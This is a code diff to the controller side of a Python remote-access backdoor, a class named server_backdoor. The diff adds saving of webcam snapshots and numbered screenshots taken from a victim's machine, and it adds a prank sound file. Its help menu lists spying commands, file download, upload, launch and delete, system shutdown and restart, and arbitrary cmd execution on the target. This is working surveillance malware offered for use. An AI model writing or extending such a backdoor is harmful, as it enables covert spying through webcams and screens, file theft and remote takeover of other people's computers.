@@ -3,11 +3,16 @@ import json
 import socket
 import base64
 import work_manager as wm
-from datetime import datetime
 
 class server_backdoor:
     work_manager = wm.manager()
-    list_of_argument_commands = ["download", "edit", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
+    list_of_argument_commands = ["download", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
+
+    TROLL_PATH = "TrollSFX\\"
+    hacked_sfx = TROLL_PATH + "CrazyLaugh.wav"
+
+    screenshot_counter = 1
+    webcam_counter = 1
 
     def __init__(self, ip, port):
         try:
@@ -43,7 +48,7 @@ class server_backdoor:
     def execute_remotely(self, command):
         try:
             self.reliable_send(command)    
-            if command[0] == "exit" or self.is_a_shutdown_type(command):
+            if str(command[0]).lower() == "exit" or self.is_a_shutdown_type(command):
                 self.connection.close()
                 exit()
     
@@ -58,7 +63,7 @@ class server_backdoor:
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return "[+] Download successful."            
+                return "[+] Successfuly downloaded to: {}.".format(path)            
         except Exception as e:
             return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)
 
@@ -69,15 +74,38 @@ class server_backdoor:
         except Exception as e:
             return "[-] (Server) Couldn't extract data from: {}, {}.".format(path, e)
 
-    def take_screenshot(self, data):
-        try:            
-            time = datetime.now()
-            file_name = "{}-{}-{}-{}-{}.png".format(time.day, time.month, time.hour, time.minute, time.second)
+    def write_webcam_snap(self, data):
+        try:
+            file_name = "\\WebcamSnap{}.png".format(self.webcam_counter)
+            self.webcam_counter += 1
             
-            self.write_file(os.getcwd() + "\\" + file_name, data)            
-            return "[+] Successfully managed to downlaod and save the screenshot."
+            path = os.getcwd() + file_name       
+            self.write_file(path, data)
+
+            return "[+] Successfully managed to download and save the camera snap at: {}.".format(path)
+        except Exception as e:
+            return "[-] Error while trying to save the saved camera snap: {}.".format(e)
+
+    def write_screenshot(self, data):
+        try:            
+            file_name = "\\Screenshot{}.png".format(self.screenshot_counter)
+            self.screenshot_counter += 1
+
+            path = os.getcwd() + file_name
+            self.write_file(path, data)          
+
+            return "[+] Successfully managed to download and save the screenshot at: {}.".format(path)
         except Exception as e:
             return "[-] Error during download of the screenshot: {}.".format(e)
+
+    def is_valid(self, cmd_0, rest_of_command):
+        #We are checking if the user wrote something that requires argument and if he really provided 
+        for i in self.list_of_argument_commands:
+            if cmd_0 == i:
+                if len(rest_of_command) == 0:
+                    return False
+        
+        return True 
 
     def help_menu(self):
         print("\nCore Commands\n=============\n")
@@ -94,13 +122,12 @@ class server_backdoor:
         print("{}\t{}".format("launch path", "Launch a file."))
         print("{}\t{}".format("del path", "Delete a file/folder."))
         print("{}\t{}".format("read path", "Read a file's content."))
-        print("{}\t{}".format("edit 1 path", "Delete the content of the file."))
-        print("{}\t{}".format("edit 2 path", "Add text to file."))
         print("{}\t{}".format("psound path", "Play a sound."))
         print("{}\t\t{}".format("stsound", "Stop the playing sound."))
 
         print("\nSpying\n======\n")
         print("Command\t\tDescription\n-------\t\t-----------")
+        print("{}\t\t{}".format("webcam", "Get a snap of the webcam."))
         print("{}\t{}".format("screenshot", "Take a screenshot."))
         print("{}\t\t{}".format("idle", "Get idle time."))
         print("{}\t\t{}".format("info", "Get Info about the user."))
@@ -114,14 +141,6 @@ class server_backdoor:
         print("{}\t{}".format("cgstate 2", "Restart the system."))
         print("{}\t{}".format("cgstate 3", "Shut down the system."))
         print("\nYou can execute any cmd command.\n")
-
-    def is_valid(self, cmd_0, rest_of_command):
-        for i in self.list_of_argument_commands:
-            if cmd_0 == i:
-                if len(rest_of_command) == 0:
-                    return False
-        
-        return True 
 
     def run(self):
         self.help_menu()
@@ -143,24 +162,16 @@ class server_backdoor:
 
                         file_content = self.read_file(file_path)
                         command.append(file_content)
-                    elif command_0 == "edit":
-                        if command[1] == "2":                       
-                            data = ""
-                            while True:
-                                txt = input("Enter what to add to the file: (S to stop): ")
-                                if txt.lower() == "s":
-                                    break
 
-                                data += "\n" + txt
-
-                            command.append(data)
-                    
                     result = self.execute_remotely(command)
-                    if command_0 == "download" and "[-]" not in result and rest_of_command != "":
-                        path = os.getcwd() + "\\" + rest_of_command
-                        result = self.write_file(path, result)
-                    elif command_0 == "screenshot" and "[-]" not in result:
-                        result = self.take_screenshot(result)
+                    if "[-]" not in result:                        
+                        if command_0 == "download" and rest_of_command != "":
+                            path = os.getcwd() + "\\" + rest_of_command
+                            result = self.write_file(path, result)
+                        elif command_0 == "screenshot":
+                            result = self.write_screenshot(result)
+                        elif command_0 == "webcam":
+                            result = self.write_webcam_snap(result)
                 else:
                     result = "You wrote incorrectly the command, for help write help."                    
             except Exception as e:
